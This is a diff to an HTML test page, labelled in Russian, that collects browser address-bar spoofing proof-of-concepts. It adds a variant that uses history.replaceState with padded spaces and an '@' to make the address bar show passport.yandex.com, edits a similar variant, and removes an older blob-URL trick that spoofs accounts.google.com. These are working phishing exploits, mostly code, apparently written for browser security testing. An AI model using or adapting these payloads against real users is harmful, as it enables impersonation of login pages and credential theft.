@@ -23,6 +23,7 @@
     <button onclick="runExp(9)">Вариант 10 (javascript prompt)</button>
     <button onclick="runExp(10)">Вариант 11 (animated title)</button>
     <button onclick="runExp(11)">Вариант 12(o)</button>
+    <button onclick="runExp(12)">Вариант 12(version)</button>
 
     <p>Код приведённых вариантов:</p>
     <pre id="code"></pre>
@@ -52,7 +53,9 @@ const variants = [
 
 `var exp = '<html><script>setInterval(()=>{document.title=Math.random()},500)<\/script><body><h2>Title мигает</h2></body></html>';\nlocation=URL.createObjectURL(new Blob([exp],{type:'text/html'}));`,
 
-`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","b:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
+`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","browser:'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
+
+`var exp = 'Fake Yandex web - Check the address Bar <script>history.replaceState("","","browser:version/'+location.protocol+'//passport.yandex.com'+Array(1000).join(' ')+'@'+location.host+'/")<\/script>';\nlocation=URL.createObjectURL(new Blob([exp], {type: "text/html"}));`,
 ];
 
 // Запуск соответствующего примера:
@@ -66,13 +69,3 @@ function runExp(idx) {
 </script>
 </body>
 </html>
-
-
-<script>
-  function poc(){
-    w=window.open('about:blank','_blank');
-    w.eval('setTimeout("opener.document.write(/pkav~/);opener.focus();window.close();",2000)');
-      setTimeout("location='blob:"+location.protocol+"//"+location.host+"%23.account.google.com/';",1000)
-  }
-</script>
-<button onclick="poc()">Boom!</button>
